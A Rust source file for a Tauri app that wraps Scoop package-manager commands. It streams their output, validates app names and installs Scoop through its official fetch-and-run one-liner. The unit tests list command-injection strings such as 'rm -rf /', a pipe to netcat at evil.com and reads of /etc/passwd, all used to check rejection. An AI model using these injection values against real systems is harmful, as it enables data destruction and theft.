//! Streaming wrappers around `scoop install / uninstall` plus a one-shot
//! Scoop bootstrap. Each command emits a typed `ScoopEvent` stream over a
//! `tauri::ipc::Channel` so the frontend can render terminal-style output
//! without polling.

use std::process::Stdio;
use std::time::Duration;

use serde::Serialize;
use tauri::ipc::Channel;
use tauri::State;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::Command;

use crate::scoop::scoop_root;
use crate::state::AppState;
use crate::winutil::{hide_console_std, hide_console_tokio};

// ──────────────────────────────────────────────── event payload ───────────

#[derive(Serialize, Clone, Debug)]
#[serde(rename_all = "camelCase", tag = "type", content = "payload")]
pub enum ScoopEvent {
    Started { command: String },
    Stdout { line: String },
    Stderr { line: String },
    Finished { exit_code: i32 },
    Error { message: String },
}

/// Wall-clock cap on a single scoop subprocess. Exceeded only by genuinely
/// hung installs; surfaces as a Stderr warning + taskkill so `running_pid`
/// is freed for the next op.
const SUBPROCESS_TIMEOUT: Duration = Duration::from_secs(30 * 60);

/// Hard cap on a Scoop app reference passed to the CLI. `bucket/app` shouldn't
/// approach this in practice; we clamp purely to bound argv size.
const MAX_APP_REF_LEN: usize = 128;

// ──────────────────────────────────────────────── helpers ─────────────────

/// Build a powershell.exe command targeting the user's scoop.ps1 entry point.
pub(crate) fn scoop_powershell(scoop_args: &[&str]) -> Result<Command, String> {
    let root = scoop_root().ok_or_else(|| "Scoop is not installed".to_string())?;
    let scoop_ps1 = root.join("apps").join("scoop").join("current").join("bin").join("scoop.ps1");
    if !scoop_ps1.exists() {
        return Err(format!(
            "Scoop entry script not found at {}",
            scoop_ps1.display()
        ));
    }

    let mut cmd = Command::new("powershell.exe");
    cmd.arg("-NoProfile")
        .arg("-NonInteractive")
        .arg("-ExecutionPolicy")
        .arg("Bypass")
        .arg("-File")
        .arg(&scoop_ps1)
        .args(scoop_args);
    Ok(cmd)
}

/// Build a powershell.exe command running an inline script. Used for the
/// Scoop bootstrap (no scoop.ps1 yet).
fn powershell_inline(script: &str) -> Command {
    let mut cmd = Command::new("powershell.exe");
    cmd.arg("-NoProfile")
        .arg("-NonInteractive")
        .arg("-ExecutionPolicy")
        .arg("Bypass")
        .arg("-Command")
        .arg(script);
    cmd
}

/// RAII guard that reserves the single in-flight scoop slot and clears it on
/// drop. Returned `None` means another op is already running (caller should
/// reject).
pub(crate) struct OpSlot<'a> {
    state: &'a AppState,
}

impl<'a> OpSlot<'a> {
    /// Reserve the in-flight slot atomically. Returns `None` if another op is
    /// already running. The slot stores a sentinel PID 0 until `drive` swaps
    /// in the real child PID after spawn — that's what closes the TOCTOU
    /// window two concurrent callers would otherwise race through.
    pub(crate) fn try_acquire(state: &'a AppState) -> Option<Self> {
        let mut guard = state.running_pid.lock();
        if guard.is_some() {
            return None;
        }
        *guard = Some(0);
        Some(Self { state })
    }
}

impl<'a> Drop for OpSlot<'a> {
    fn drop(&mut self) {
        *self.state.running_pid.lock() = None;
    }
}

/// Acquire an op slot or emit an Error event + return Err. Used by every
/// scoop-touching command entry point.
pub(crate) fn acquire_or_reject<'a>(
    state: &'a AppState,
    on_event: &Channel<ScoopEvent>,
) -> Result<OpSlot<'a>, String> {
    match OpSlot::try_acquire(state) {
        Some(slot) => Ok(slot),
        None => {
            let msg = "another scoop operation is already running".to_string();
            let _ = on_event.send(ScoopEvent::Error {
                message: msg.clone(),
            });
            Err(msg)
        }
    }
}

/// Spawn a `Command`, wire stdout+stderr to a streaming `Channel`, and resolve
/// once the child exits. Caller is responsible for any post-completion
/// state mutation (cache refresh, etc.).
///
/// `running_pid` is expected to already hold the slot reservation (sentinel
/// 0 from a held `OpSlot`). drive temporarily swaps it for the spawned
/// child's PID so `scoop_cancel` can taskkill the right process, then
/// restores the prior value (sentinel) on completion. Restoring rather than
/// clearing matters for multi-step orchestrators (presets_apply) that hold
/// one slot across several drives.
pub(crate) async fn drive(
    mut cmd: Command,
    on_event: &Channel<ScoopEvent>,
    state: &State<'_, AppState>,
    label: &str,
) -> Result<i32, String> {
    cmd.stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .stdin(Stdio::null());

    hide_console_tokio(&mut cmd);

    let _ = on_event.send(ScoopEvent::Started {
        command: label.to_string(),
    });

    let prev_slot = *state.running_pid.lock();

    let mut child = cmd.spawn().map_err(|e| e.to_string())?;
    let pid = child.id();

    if let Some(pid) = pid {
        *state.running_pid.lock() = Some(pid);
    }

    let stdout = match child.stdout.take() {
        Some(s) => s,
        None => {
            *state.running_pid.lock() = prev_slot;
            return Err("failed to capture stdout".into());
        }
    };
    let stderr = match child.stderr.take() {
        Some(s) => s,
        None => {
            *state.running_pid.lock() = prev_slot;
            return Err("failed to capture stderr".into());
        }
    };

    let stdout_chan = on_event.clone();
    let stdout_task = tokio::spawn(async move {
        let mut lines = BufReader::new(stdout).lines();
        while let Ok(Some(line)) = lines.next_line().await {
            let _ = stdout_chan.send(ScoopEvent::Stdout { line });
        }
    });

    let stderr_chan = on_event.clone();
    let stderr_task = tokio::spawn(async move {
        let mut lines = BufReader::new(stderr).lines();
        while let Ok(Some(line)) = lines.next_line().await {
            let _ = stderr_chan.send(ScoopEvent::Stderr { line });
        }
    });

    let wait = child.wait();
    let wait_result = match tokio::time::timeout(SUBPROCESS_TIMEOUT, wait).await {
        Ok(r) => r,
        Err(_) => {
            // Timeout: kill the child so it can't keep filling pipes; restore
            // the prior slot (sentinel) so the OpSlot guard still controls
            // overall release.
            if let Some(pid) = pid {
                kill_pid(pid).await;
            }
            let _ = on_event.send(ScoopEvent::Stderr {
                line: format!(
                    "◇ killed after {}m wall-clock timeout",
                    SUBPROCESS_TIMEOUT.as_secs() / 60
                ),
            });
            *state.running_pid.lock() = prev_slot;
            return Err("scoop subprocess timed out".into());
        }
    };
    let _ = stdout_task.await;
    let _ = stderr_task.await;

    *state.running_pid.lock() = prev_slot;

    let status = wait_result.map_err(|e| e.to_string())?;
    Ok(status.code().unwrap_or(-1))
}

async fn kill_pid(pid: u32) {
    let mut kill = Command::new("taskkill");
    kill.args(["/T", "/F", "/PID", &pid.to_string()])
        .stdout(Stdio::null())
        .stderr(Stdio::null());
    hide_console_tokio(&mut kill);
    let _ = kill.status().await;
}

/// Validate that `app_name` looks like a Scoop app reference (optionally
/// `bucket/name`). Rejects anything containing whitespace, semicolons, pipes,
/// quotes, ampersands, or other shell metacharacters. Length is bounded so
/// pathological inputs can't blow up the argv buffer.
fn validate_app_ref(app: &str) -> Result<(), String> {
    if app.is_empty() {
        return Err("app name cannot be empty".into());
    }
    if app.len() > MAX_APP_REF_LEN {
        return Err(format!(
            "app name too long ({} > {} chars)",
            app.len(),
            MAX_APP_REF_LEN
        ));
    }
    let allowed =
        |c: char| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '+' | '@' | '/');
    if !app.chars().all(allowed) {
        return Err(format!("invalid app name: {app:?}"));
    }
    Ok(())
}

/// Shared body for install / update / uninstall.
async fn run_scoop_app_op(
    verb: &'static str,
    app: &str,
    on_event: &Channel<ScoopEvent>,
    state: &State<'_, AppState>,
) -> Result<(), String> {
    if let Err(e) = validate_app_ref(app) {
        let _ = on_event.send(ScoopEvent::Error {
            message: e.clone(),
        });
        return Err(e);
    }

    let cmd = match scoop_powershell(&[verb, app]) {
        Ok(c) => c,
        Err(e) => {
            let _ = on_event.send(ScoopEvent::Error {
                message: e.clone(),
            });
            return Err(e);
        }
    };
    let label = format!("scoop {verb} {app}");
    let exit_code = drive(cmd, on_event, state, &label).await?;
    let _ = on_event.send(ScoopEvent::Finished { exit_code });

    state.catalog.refresh();
    Ok(())
}

// ──────────────────────────────────────────────── commands ────────────────

#[tauri::command]
pub async fn scoop_install(
    app: String,
    on_event: Channel<ScoopEvent>,
    state: State<'_, AppState>,
) -> Result<(), String> {
    let _slot = acquire_or_reject(&state, &on_event)?;
    run_scoop_app_op("install", &app, &on_event, &state).await
}

#[tauri::command]
pub async fn scoop_update(
    app: String,
    on_event: Channel<ScoopEvent>,
    state: State<'_, AppState>,
) -> Result<(), String> {
    let _slot = acquire_or_reject(&state, &on_event)?;
    run_scoop_app_op("update", &app, &on_event, &state).await
}

#[tauri::command]
pub async fn scoop_uninstall(
    app: String,
    on_event: Channel<ScoopEvent>,
    state: State<'_, AppState>,
) -> Result<(), String> {
    let _slot = acquire_or_reject(&state, &on_event)?;
    run_scoop_app_op("uninstall", &app, &on_event, &state).await
}

#[tauri::command]
pub async fn scoop_bootstrap(
    on_event: Channel<ScoopEvent>,
    state: State<'_, AppState>,
) -> Result<(), String> {
    let _slot = acquire_or_reject(&state, &on_event)?;

    // The official one-liner. -Force on Set-ExecutionPolicy keeps it from
    // prompting the user when the policy is already RemoteSigned.
    let script = "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force; \
                  Invoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression";
    let cmd = powershell_inline(script);
    let exit_code = drive(cmd, &on_event, &state, "scoop bootstrap").await?;
    let _ = on_event.send(ScoopEvent::Finished { exit_code });

    // Bootstrap may have just created the scoop install — invalidate the
    // cached `scoop_root()` so the next caller actually finds it.
    crate::scoop::invalidate_cache();
    state.catalog.refresh();
    Ok(())
}

/// Cancel the in-flight scoop operation, if any. Sends `taskkill /T /F /PID`
/// so PowerShell + scoop subprocesses are killed too. Returns true if a
/// process was cancelled. Bumps cancellation_gen so multi-step orchestrations
/// (preset apply) can detect that they should abort.
///
/// We deliberately do NOT clear `running_pid` here — that's the slot
/// reservation owned by the current OpSlot. Letting it linger means a
/// concurrent acquire can't slip in between this kill and the in-flight
/// op's natural unwind. drive() restores the prior sentinel when its child
/// exits; OpSlot::drop releases for real on the outer scope.
#[tauri::command]
pub async fn scoop_cancel(state: State<'_, AppState>) -> Result<bool, String> {
    state
        .cancellation_gen
        .fetch_add(1, std::sync::atomic::Ordering::SeqCst);

    let pid = { *state.running_pid.lock() };
    let Some(pid) = pid else {
        return Ok(false);
    };
    // Sentinel slot reservation (PID 0): a slot is held but no child has
    // spawned yet — nothing to kill. The cancellation_gen bump will be
    // observed by the orchestrator on its next step.
    if pid == 0 {
        return Ok(true);
    }

    let mut kill = std::process::Command::new("taskkill");
    kill.args(["/T", "/F", "/PID", &pid.to_string()])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null());
    hide_console_std(&mut kill);
    let _ = tokio::task::spawn_blocking(move || kill.status()).await;
    Ok(true)
}

#[cfg(test)]
mod tests {
    use super::validate_app_ref;

    #[test]
    fn accepts_plain_app_names() {
        assert!(validate_app_ref("redis").is_ok());
        assert!(validate_app_ref("postgresql").is_ok());
        assert!(validate_app_ref("mysql-lts").is_ok());
        assert!(validate_app_ref("mongodb-database-tools").is_ok());
        assert!(validate_app_ref("nodejs18").is_ok());
    }

    #[test]
    fn accepts_bucket_qualified_names() {
        assert!(validate_app_ref("main/redis").is_ok());
        assert!(validate_app_ref("extras/memurai").is_ok());
    }

    #[test]
    fn rejects_shell_metacharacters() {
        for evil in [
            "redis; rm -rf /",
            "redis && malicious",
            "redis | nc evil.com 80",
            "redis`whoami`",
            "redis$(whoami)",
            "redis\"; bad",
            "redis'; bad",
            "redis & bad",
            "redis > out.txt",
            "redis < /etc/passwd",
            "redis\n# more",
            "redis #comment",
        ] {
            assert!(
                validate_app_ref(evil).is_err(),
                "should have rejected: {evil:?}"
            );
        }
    }

    #[test]
    fn rejects_empty() {
        assert!(validate_app_ref("").is_err());
    }

    #[test]
    fn rejects_overlong() {
        let long = "a".repeat(200);
        assert!(validate_app_ref(&long).is_err());
    }
}
